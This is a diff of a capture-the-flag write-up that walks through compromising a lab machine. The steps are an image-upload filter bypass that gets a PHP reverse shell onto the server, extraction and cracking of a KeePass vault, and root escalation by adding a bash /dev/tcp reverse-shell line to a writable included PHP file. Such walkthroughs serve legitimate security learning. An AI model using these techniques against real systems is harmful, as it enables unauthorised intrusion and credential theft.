@@ -11,7 +11,7 @@ PING 10.10.126.252 (10.10.126.252) 56(84) bytes of data.
 rtt min/avg/max/mdev = 57.339/58.129/59.765/0.965 ms
 ````
 
-A basic Nmap scan to find out which ports are open
+A basic Nmap scan to find out which ports are open.
 ````
 Nmap scan report for 10.10.126.252
 Host is up (0.060s latency).
@@ -62,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
 
 There is a login page in the webserver so that is where I'm going to start as it's the most promising.
 I checked the page source but there was nothing. I then tried a few basic usernames and passwords for the login but to no avail.
-Decided to brute force for directories with feroxbuster `feroxbuster -u http://10.10.126.252`
+Decided to brute force for directories with feroxbuster `feroxbuster -u http://10.10.126.252`.
 ````
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -94,9 +94,13 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 ````
 
 `/cloud/` allows uploading images via external URLs. As expected there is a filter that only allows image files to be uploaded. 
-I use `https://www.revshells.com/` to generate a PHP reverse shell that I can try to upload. 
+I used `https://www.revshells.com/` to generate a PHP reverse shell that I can try to upload. 
 I named my reverse shell `rev.php#.png` and hosted it with `python3 -m http.server 8082`
-The website tries to GET `rev.php` so I changed the reverse shell name to `rev.php`
+````
+Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
+10.10.126.252 - - [27/Nov/2023 17:09:40] "GET /rev.php HTTP/1.1" 404 -
+````
+The website tries to GET `rev.php` so I renamed the reverse shell `rev.php`
 `http://<my_ip>:8082/rev.php#.png` downloads my PHP reverse shell and executes it. I had a listener `ncat -lvnp 1234` that caught the connection.
 ````
 Ncat: Version 7.94SVN ( https://nmap.org/ncat )
@@ -110,7 +114,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 I went a few directories up and found the `login.php` that has a clear text username and password list for the login page.
 The site had pretty much nothing in it sadly.
 
-`cat /etc/passwd | grep -v nologin` allows me to check users that might have login allowed.
+`cat /etc/passwd | grep -v nologin` checks for users that might have login allowed.
 ````
 root:x:0:0:root:/root:/bin/bash
 sync:x:4:65534:sync:/bin:/bin/sync
@@ -125,14 +129,63 @@ While checking `/opt` directory I stumbled across `dataset.kdbx` which is a KeeP
 I could not use SCP to transfer the file so I tried the `/cloud/images` folder. 
 So I copied the `dataset.kdbx` to `/var/www/html/cloud/images` and then went to `http://10.10.126.252/cloud/images/dataset.kdbx` to download it.
 
+JohnTheRipper allows us to convert the vault file into a crackable format with `keepass2john dataset.kdbx > hash` .
+`john --wordlist=/usr/share/wordlists/rockyou.txt hash` finds the right password for the vault.
+I looked at what could I use to open the vault file and found `kpcli`. A `config.ini` file needed to be set to point to the `dataset.kdbx`.
 
 
+````
+kpcli ls --entries
+UNLOCKING...
 
+Database password:
+================================================================================
+Root
+================================================================================
+user:password
+````
 
+````
+kpcli get user:password
 
+UNLOCKING...
 
+Database password:
+================================================================================
+Root/user:password
+================================================================================
+name: Root/user:password
+username: sysadmin
+password: **********************
+URL:
+Notes:
+````
 
+````
+kpcli cp user:password
+UNLOCKING...
 
+Database password:
+Entry: Root/user:password
+````
+Finally, we have the password for `sysadmin` user. Let's try to SSH as `sysadmin` to the target.
+````
+sysadmin@opacity:~$ id
+uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
+````
+We don't have permission to run anything as root but there is `scripts` folder in the user's home folder.
+`script.php` has the line `require_once('lib/backup.inc.php');`. `sysadmin` is the owner of the `lib` folder so we can replace the `backup.inc.php` file.
+I copied the file to `/home/sysadmin` and added the line `exec("/bin/bash -c 'bash -i > /dev/tcp/your_ip/1234 0>&1'");` to it.
+First I had to remove the old file from the folder as it was write-protected. I then copied the file I edited to the original location.
+Again, started an Ncat listener with `ncat -lvnp 1234` to catch the incoming connection.
+````
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.126.252:36842.
+id
+uid=0(root) gid=0(root) groups=0(root)
+````
 
 
 
